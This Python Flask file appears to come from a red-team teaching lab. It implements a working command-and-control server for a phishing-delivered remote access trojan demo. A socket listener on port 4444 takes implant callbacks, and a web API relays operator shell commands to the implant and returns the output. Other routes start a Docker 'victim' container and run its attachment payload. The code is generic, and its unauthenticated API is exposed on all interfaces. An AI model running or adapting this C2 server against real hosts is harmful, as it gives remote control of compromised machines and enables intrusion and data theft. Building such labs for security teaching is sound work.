"""
Red Team Demo - Authorized security education.
C2 listener + web UI for RAT-by-phishing demo. All actions (deploy target, execute payload, C2) via GUI.
Live C2 activity (real socket traffic) is logged and shown in the UI.
"""
import os
import queue
import socket
import subprocess
import threading
from collections import deque
from datetime import datetime, timezone
from flask import Flask, render_template, request, jsonify, send_from_directory

APP_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(
    __name__,
    template_folder=os.path.join(APP_DIR, "templates"),
    static_folder=os.path.join(APP_DIR, "static"),
)

# C2 activity log: last N events (thread-safe), each {"ts": iso, "event": str, "detail": str}
ATTACK_LOG_MAX = 100
_attack_log = deque(maxlen=ATTACK_LOG_MAX)
_attack_log_lock = threading.Lock()


def _log_event(event: str, detail: str = "") -> None:
    with _attack_log_lock:
        _attack_log.append({
            "ts": datetime.now(timezone.utc).isoformat(),
            "event": event,
            "detail": detail,
        })

# Security: response headers
@app.after_request
def security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "SAMEORIGIN"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return response

# Project root = parent of demo-ui (where docker-compose.yml lives)
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

LISTEN_PORT = 4444
LISTEN_HOST = "0.0.0.0"
CONTAINER_NAME = "primary-doctor"

# Shared state (protected by session_lock)
session_lock = threading.Lock()
listener_socket = None
listener_thread = None
session_socket = None
session_banner = ""
session_thread = None
command_queue = queue.Queue()
response_holder = {"response": None, "ready": threading.Condition()}


def session_worker(client_socket: socket.socket) -> None:
    global session_banner
    peer = "unknown"
    try:
        try:
            peer = "%s:%s" % client_socket.getpeername()
        except Exception:
            pass
        _log_event("callback", "Connection from %s" % peer)
        banner = client_socket.recv(4096).decode(errors="ignore")
        with session_lock:
            session_banner = banner
        _log_event("beacon", "Beacon received (%d bytes) from %s" % (len(banner), peer))
        while True:
            try:
                cmd = command_queue.get(timeout=0.5)
                if cmd is None or cmd.strip().lower() in ("exit", "quit"):
                    _log_event("cmd", "Session closed by operator")
                    break
                client_socket.sendall((cmd + "\n").encode())
                _log_event("cmd", "Sent: %s" % (cmd[:80] + ("..." if len(cmd) > 80 else "")))
                data = client_socket.recv(65536)
                if not data:
                    break
                with response_holder["ready"]:
                    response_holder["response"] = data.decode(errors="replace")
                    response_holder["ready"].notify()
                _log_event("out", "%d bytes from implant" % len(data))
            except queue.Empty:
                continue
            except (BrokenPipeError, ConnectionResetError, OSError):
                break
    finally:
        _log_event("session_end", "Session ended (peer %s)" % peer)
        try:
            client_socket.close()
        except Exception:
            pass
        with session_lock:
            global session_socket, session_thread
            # Only clear session if this worker is still the active one (don't wipe a reconnected client)
            if session_socket is client_socket:
                session_socket = None
                session_thread = None


def listener_worker() -> None:
    global listener_socket, session_socket, session_thread
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)
    _log_event("listener", "C2 listener bound 0.0.0.0:%d (waiting for callbacks)" % LISTEN_PORT)
    with session_lock:
        listener_socket = server
    while True:
        try:
            client, _ = server.accept()
            with session_lock:
                if session_socket is not None:
                    try:
                        session_socket.close()
                    except Exception:
                        pass
                session_socket = client
                session_thread = threading.Thread(target=session_worker, args=(client,))
                session_thread.daemon = True
                session_thread.start()
        except OSError:
            break


@app.route("/")
def index() -> str:
    return render_template("index.html")


@app.route("/favicon.ico")
def favicon():
    """Serve favicon so the browser doesn't 404."""
    return send_from_directory(
        app.static_folder, "favicon.svg", mimetype="image/svg+xml"
    )


def _container_running() -> bool:
    """Return True if primary-doctor container is running."""
    try:
        r = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Running}}", CONTAINER_NAME],
            capture_output=True,
            text=True,
            timeout=5,
            cwd=PROJECT_ROOT,
        )
        return r.returncode == 0 and r.stdout.strip().lower() == "true"
    except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
        return False


@app.route("/api/container-activity")
def api_container_activity() -> tuple:
    """Return live process list from the victim container (docker top)."""
    if not _container_running():
        return jsonify({"ok": True, "output": "(container not running)"})
    try:
        r = subprocess.run(
            ["docker", "top", CONTAINER_NAME],
            capture_output=True,
            text=True,
            timeout=5,
            cwd=PROJECT_ROOT,
        )
        out = r.stdout if r.returncode == 0 else (r.stderr or "(no output)")
        return jsonify({"ok": True, "output": out.strip() or "(no processes)"})
    except (FileNotFoundError, subprocess.TimeoutExpired, Exception) as e:
        return jsonify({"ok": True, "output": f"(error: {e})"})


@app.route("/api/attack-log")
def api_attack_log() -> tuple:
    """Return recent C2 activity (listener, callbacks, beacons, commands, output)."""
    with _attack_log_lock:
        events = list(_attack_log)
    return jsonify({"ok": True, "events": events})


@app.route("/api/status")
def api_status() -> dict:
    with session_lock:
        has_session = session_socket is not None
        banner = session_banner if has_session else ""
    return jsonify({
        "listening": listener_socket is not None,
        "port": LISTEN_PORT,
        "session_active": has_session,
        "banner": banner,
        "container_running": _container_running(),
    })


@app.route("/api/start-containers", methods=["POST"])
def api_start_containers() -> tuple:
    """Start the victim (primary-doctor) container via docker compose."""
    try:
        proc = subprocess.run(
            ["docker", "compose", "up", "-d", "--build"],
            cwd=PROJECT_ROOT,
            capture_output=True,
            text=True,
            timeout=180,
        )
        if proc.returncode != 0:
            err = (proc.stderr or proc.stdout or "Unknown error").strip()
            return jsonify({"ok": False, "message": err}), 400
        # Wait until container is actually running
        for _ in range(30):
            if _container_running():
                return jsonify({"ok": True, "message": "Victim container is running."})
            threading.Event().wait(1)
        return jsonify({"ok": True, "message": "Compose started; container may still be starting."})
    except subprocess.TimeoutExpired:
        return jsonify({"ok": False, "message": "Docker compose timed out."}), 500
    except FileNotFoundError:
        return jsonify({"ok": False, "message": "Docker not found. Install Docker and try again."}), 500
    except Exception as e:
        return jsonify({"ok": False, "message": str(e)}), 500


@app.route("/api/trigger-victim", methods=["POST"])
def api_trigger_victim() -> tuple:
    """Run the payload inside the primary-doctor container (docker exec)."""
    try:
        _log_event("trigger", "Payload execution triggered (victim opening attachment)")
        subprocess.Popen(
            ["docker", "exec", "primary-doctor", "/app/scripts/open_email_attachment.sh"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return jsonify({"ok": True, "message": "Triggered. Victim is opening the attachment..."})
    except FileNotFoundError:
        return jsonify({"ok": False, "message": "Docker not found. Is the container running? Run: docker compose up -d"}), 400
    except Exception as e:
        return jsonify({"ok": False, "message": str(e)}), 500


# Max command length to prevent abuse / buffer issues
MAX_CMD_LEN = 8192

@app.route("/api/command", methods=["POST"])
def api_command() -> tuple:
    data = request.get_json(silent=True) or {}
    raw = data.get("cmd")
    if raw is None:
        return jsonify({"ok": False, "output": "Missing command"})
    # Normalize: string, strip, remove null bytes
    cmd = (str(raw).replace("\x00", "").strip())[:MAX_CMD_LEN]
    if not cmd:
        return jsonify({"ok": False, "output": "Empty command"})
    with session_lock:
        if session_socket is None:
            return jsonify({"ok": False, "output": "No active session. Deploy target and execute payload first."})
    if cmd.lower() in ("exit", "quit"):
        command_queue.put(cmd)
        return jsonify({"ok": True, "output": "Session closed."})
    with response_holder["ready"]:
        response_holder["response"] = None
    command_queue.put(cmd)
    with response_holder["ready"]:
        response_holder["ready"].wait(timeout=15)
        out = response_holder.get("response")
    if out is None:
        return jsonify({"ok": False, "output": "Timeout or session closed."})
    return jsonify({"ok": True, "output": out})


def main() -> None:
    global listener_thread
    port = int(os.environ.get("PORT", 5000))
    listener_thread = threading.Thread(target=listener_worker)
    listener_thread.daemon = True
    listener_thread.start()
    print(f"[*] Listener started on 0.0.0.0:{LISTEN_PORT}")
    print(f"[*] Open http://127.0.0.1:{port} in your browser for the demo UI.\n")
    app.run(host="0.0.0.0", port=port, threaded=True, debug=False)


if __name__ == "__main__":
    main()
